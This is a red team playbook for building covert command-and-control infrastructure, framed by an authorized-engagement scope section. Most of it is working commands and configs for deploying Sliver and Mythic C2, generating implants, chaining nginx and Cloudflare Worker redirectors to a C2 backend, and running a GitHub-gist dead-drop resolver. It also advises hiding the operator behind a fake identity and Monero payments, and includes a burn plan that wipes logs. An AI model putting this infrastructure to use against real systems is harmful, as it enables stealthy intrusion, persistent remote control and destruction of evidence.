# Red Team Infrastructure Playbook

> Operator's playbook for building, deploying, and operating stealthy red team infrastructure. Covers scoping, C2 framework selection, redirector chains, OPSEC compartmentalization, and engagement lifecycle. Target audience: experienced offensive operators already familiar with C2 concepts, networking, and MITRE ATT&CK TA0011.

## 1. Engagement Scoping

### 1.1 Confirm scope

| Item | Detail |
|------|--------|
| Target environment | Corp / OT / cloud / hybrid |
| Engagement duration | 1 day / 1 week / 1 month / 6 months |
| C2 platforms in scope | Sliver / Mythic / Havoc / CS / Brute Ratel |
| Domain tier budget | 1 (throwaway) / 2 (business-look) / 3 (long-lived) |
| Hosting providers allowed | DO / Vultr / Hetzner / AWS / GCP / Azure |
| Cloud-native redirectors | Lambda / Functions / Workers allowed? |
| Out of scope | production egress DoS, real customer data, social engineering |
| Time window | |
| Communications channel | |

### 1.2 Rules of engagement

- **No production impact** — never crash production services with C2 volume
- **No real customer data** — use synthetic data only
- **Notify SOC** before high-volume beacon
- **Burn plan** — pre-approved by customer
- **Crypto payments** for OPSEC where allowed
- **Pause testing** if any production service affected

### 1.3 Test boundaries

- Allowed: deploy C2 against authorized in-scope target
- Allowed: redirector chain + domain fronting
- Disallowed: attack on out-of-scope hosts, lateral movement beyond scope

## 2. Pre-Engagement Recon

### 2.1 Map target's egress surface

```bash
# Outbound port scan (test allowed ports)
for port in 53 80 443 123 445 3306 3389 5432 5900 8080 8443; do
  timeout 2 nc -vz exit-proxy.example.com $port 2>&1 | grep -E "succeeded" && echo "Port $port OPEN"
done

# UDP test
for port in 53 123 161 500; do
  timeout 2 nc -uvz exit-proxy.example.com $port 2>&1 | head -2
done
```

### 2.2 Identify DLP/SWG

```bash
# Response headers
curl -sI https://www.google.com | grep -iE "zscaler|netskope|forcepoint|bluecoat|symantec|cisco|paloalto|fortinet"

# TLS inspection (look for interception CA)
echo | openssl s_client -showcerts -connect www.google.com:443 -servername www.google.com 2>&1 \
  | grep -iE "issuer=|verify return"
```

### 2.3 Identify allowed CDN / SaaS

```bash
for svc in cdn.cloudflare.com cdn.fastly.com api.github.com gist.githubusercontent.com drive.google.com; do
  curl -sI https://$svc -o /dev/null -w "%{http_code} $svc\n" --connect-timeout 3
done
```

## 3. Lab Setup

### 3.1 Sliver C2 lab

```bash
curl https://sliver.sh/install | sudo bash
sliver

# Generate implant
sliver > generate --http https://localhost:8443 --os linux --arch amd64

# Implant listener
sliver > http
```

### 3.2 Mythic C2 lab

```bash
git clone https://github.com/its-a-feature/Mythic
cd Mythic
sudo ./install_docker_ubuntu.sh
sudo nano .env
sudo ./mythic-cli start
sudo ./mythic-cli install github https://github.com/MythicAgents/Apollo
sudo ./mythic-cli install github https://github.com/MythicC2Profiles/http
sudo ./mythic-cli rebuild
```

### 3.3 Nginx mTLS redirector lab

```bash
sudo apt install nginx

mkdir /etc/nginx/mtls && cd /etc/nginx/mtls

# CA
openssl genrsa -out ca.key 4096
openssl req -new -x509 -days 3650 -key ca.key -out ca.crt -subj "/CN=RedTeam CA"

# Client cert
openssl genrsa -out client.key 2048
openssl req -new -key client.key -out client.csr -subj "/CN=implant"
openssl x509 -req -in client.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out client.crt -days 365

# Nginx config
cat > /etc/nginx/conf.d/c2.conf << 'EOF'
server {
    listen 443 ssl http2;
    server_name redirector.example.com;

    ssl_certificate /etc/letsencrypt/live/redirector/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/redirector/privkey.pem;

    ssl_client_certificate /etc/nginx/mtls/ca.crt;
    ssl_verify_client on;

    location /api/ {
        proxy_pass https://c2-backend.example.com:8443;
    }

    location / {
        return 404;
    }
}
EOF

sudo nginx -t && sudo systemctl reload nginx
```

### 3.4 Cloudflare worker redirector lab

```bash
npm install -g wrangler
wrangler login

mkdir c2-worker && cd c2-worker
wrangler init --yes

cat > src/index.js << 'EOF'
export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    if (request.method !== 'POST' || !request.headers.get('X-Implant-Auth')) {
      return new Response('Not Found', { status: 404 });
    }
    url.hostname = 'c2-backend.example.com';
    url.port = '8443';
    return fetch(url.toString(), request);
  }
}
EOF

wrangler deploy
```

## 4. Attack Workflow — Stage by Stage

### Stage 1 — Domain procurement (1 day)

**Goal**: 4+ domains tiered across categories.

```bash
# Tier-1: 2 throwaway (.xyz)
# Tier-2: 1 business-look (.com, 1+ year)
# Tier-3: 1 long-lived (.com, 5+ year)

# Check categorization before deploy
curl -s "https://sitereview.bluecoat.com/resource/lookup-request/$DOMAIN" | jq .
```

**Output**: domain portfolio document with categorization + age.

### Stage 2 — Hosting procurement (1 day)

```bash
# Compartmentalized:
# Team-A: DigitalOcean, prepaid card
# Team-B: Vultr, Monero
# Team-C: Hetzner, BTC
# Team-D: AWS, separate account

# Provision VPS
doctl compute droplet create c2 --size s-1vcpu-1gb --image ubuntu-22-04-x64 --region nyc3 --ssh-keys $KEY
```

### Stage 3 — C2 backend deployment (4 hours)

```bash
# Sliver
curl https://sliver.sh/install | sudo bash
sliver
sliver > http --domain c2.example.com --web-port 8443

# Verify
curl -k https://c2.example.com:8443/health
```

### Stage 4 — Redirector chain deployment (1 day)

```bash
# Cloudflare worker (tier-1)
wrangler deploy

# Nginx mTLS (tier-2)
sudo cp nginx.conf /etc/nginx/conf.d/c2.conf && sudo systemctl reload nginx

# Cert via Let's Encrypt
sudo certbot certonly --dns-cloudflare --dns-cloudflare-credentials ~/.cloudflare.ini -d '*.redirector.example.com'

# Test full chain
curl --cert client.crt --key client.key https://front.example.com/api/health
```

### Stage 5 — Implant generation (1 hour)

```bash
sliver > generate --http https://front.example.com \
                  --os linux \
                  --arch amd64 \
                  --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
```

### Stage 6 — Dead-drop resolver setup (1 hour)

```bash
# GitHub gist
C2_IP=$(curl -s ifconfig.me)
GIST_RESP=$(curl -s -X POST -H "Authorization: token $GH_PAT" \
  https://api.github.com/gists \
  -d "{\"description\":\"config\",\"files\":{\"config.txt\":{\"content\":\"$C2_IP\"}}}")
GIST_ID=$(echo $GIST_RESP | jq -r .id)

# Implant polls
C2_IP=$(curl -s https://gist.githubusercontent.com/$USER/$GIST_ID/raw/config.txt)
```

### Stage 7 — Engagement operations (varies)

```bash
# Monitor VT
while true; do
  for d in $(cat domains.txt); do
    score=$(curl -s "https://www.virustotal.com/vtapi/v2/domain/report?domain=$d&apikey=$VT_API" | jq -r '.detected_urls | length')
    [ $score -gt 0 ] && echo "ALERT: $d has $score detections"
  done
  sleep 3600
done
```

### Stage 8 — Detection response (varies)

```bash
# If detected: execute burn plan
./burn.sh

# Burn script:
# 1. Stop services
# 2. Revoke certs
# 3. Wipe logs
# 4. Destroy VPS (terraform destroy)
# 5. Migrate domains
# 6. Update dead-drop resolver
```

### Stage 9 — Cleanup + reporting (1 day)

```bash
# Final cleanup
terraform destroy -auto-approve

# Burn log
echo "$(date) | engagement complete | all infrastructure destroyed" >> burn-log.txt
```

## 5. Common Pitfalls

### 5.1 Reusing infrastructure across engagements

Reuse of domains / IPs / SSH keys allows blue team to link engagements.

**Fix**: Compartmentalize everything. Rotate all keys. Burn all infrastructure.

### 5.2 Co-locating C2 + redirector

Single-VPS deployment means redirector serves no purpose.

**Fix**: Always separate C2 backend from redirector on different VPS.

### 5.3 Hardcoded operator identity

WHOIS data, payment method, hosting account leaks operator identity.

**Fix**: Use privacy registrars (Njalla). Pay via Monero. Use fake identity.

### 5.4 No burn plan

Detection during engagement without a burn plan means panic + extended exposure.

**Fix**: Pre-stage burn plan. Rehearse quarterly. Customer sign-off on burn.

### 5.5 Over-relying on domain fronting

AWS CloudFront removed fronting 2018; some Cloudflare customers block it.

**Fix**: Test fronting before relying on it. Have fallback channels.

### 5.6 Default malleable C2 profile

CS / Sliver default profiles are well-signatured.

**Fix**: Always author custom profile mimicking legitimate API.

### 5.7 Single C2 channel

Single channel (HTTPS-only) means single point of failure.

**Fix**: Multi-channel (HTTPS + DNS + mTLS) for resilience.

## 6. Time Budget Cheat Sheet

| Engagement size | Recon | Procurement | Deploy | Operate | Burn |
|-----------------|-------|-------------|--------|---------|------|
| 1-day test | 2h | 4h | 4h | 8h | 2h |
| 1-week emulation | 1d | 1d | 1d | 5d | 1d |
| 1-month engagement | 2d | 2d | 1d | 4w | 2d |
| 6-month long-term | 1w | 1w | 2d | 6mo | 1w |

## 7. Tool Inventory

### 7.1 C2 frameworks

| Tool | License | Platforms | Notes |
|------|---------|-----------|-------|
| Mythic | Open | Multi | Docker-based, modular |
| Sliver | Open | Multi | Go, modern |
| Havoc | Open | Win/Mac/Linux | C++ implant |
| Covenant | Open | Windows | .NET agent |
| PoshC2 | Open | Windows | PowerShell |
| Brute Ratel | Commercial | Windows | $2500+ |
| Cobalt Strike | Commercial | Windows | $3000+ |

### 7.2 Redirectors / proxies

| Tool | Purpose | Notes |
|------|---------|-------|
| Nginx | Reverse proxy | mTLS support |
| Cloudflare Workers | Serverless proxy | Free tier |
| socat | Socket relay | Universal |
| chisel | HTTP tunnel | mTLS support |
| gost | Multi-proto tunnel | SOCKS/HTTP/TLS |
| cloudflared | Cloudflare tunnel | Free |

### 7.3 Infrastructure-as-code

| Tool | Purpose |
|------|---------|
| Terraform | Multi-cloud provisioning |
| Ansible | Configuration management |
| CloudFormation | AWS-native |
| Pulumi | Multi-cloud (code-based) |

### 7.4 Detection / OPSEC tools

| Tool | Purpose |
|------|---------|
| VirusTotal | Domain reputation monitoring |
| Cisco Umbrella | Categorization |
| Bluecoat SiteReview | Categorization |
| Fortiguard | Categorization |
| JA3 fingerprinting | TLS profile analysis |

## 8. Engagement Quality Checklist

Before reporting complete:

- [ ] All in-scope C2 platforms deployed
- [ ] Redirector chain (≥3 tiers) operational
- [ ] Domain portfolio tiered (1/2/3)
- [ ] Cert automation (Let's Encrypt ACME)
- [ ] Dead-drop resolver operational
- [ ] OPSEC compartmentalization (separate accounts / payment / SSH)
- [ ] Burn plan documented + tested
- [ ] Implant tested through full chain
- [ ] Detection monitoring (VT, Umbrella) in place
- [ ] Final report delivered
- [ ] SOC handoff (detection tuning)

## 9. References

- MITRE ATT&CK Command and Control — https://attack.mitre.org/tactics/TA0011/
- Mythic documentation — https://docs.mythic-c2.net/
- Sliver documentation — https://sliver.sh/docs/
- Havoc documentation — https://havocframework.com/docs/
- "Red Team Infrastructure" (Rasta Mouse, 2023)
- "Defending Against Command-and-Control" (SpecterOps, 2022)
- "C2 Infrastructure 101" (TrustedSec, 2023)
- "Compartmentalizing Infrastructure" (Red Siege, 2023)
- "Domain Fronting" (CSIS 2017)
- "Cloudflare Workers for C2" (0xPat, 2022)
- Mandiant APT29 / NOBELIUM reports (2021–2024)
- CrowdStrike 2024 Global Threat Report
- "Red Team Field Manual" (RTFM)
- "Operator Handbook" (Hausknecht, 2023)
- SpecterOps "Tradecraft" series
- BlackHat USA 2023 — "Modern C2 Infrastructure"
- "Cobalt Strike OPSEC" (Rasta Mouse, 2022)
- "Detection Engineering" (Kyle Riley, 2023)
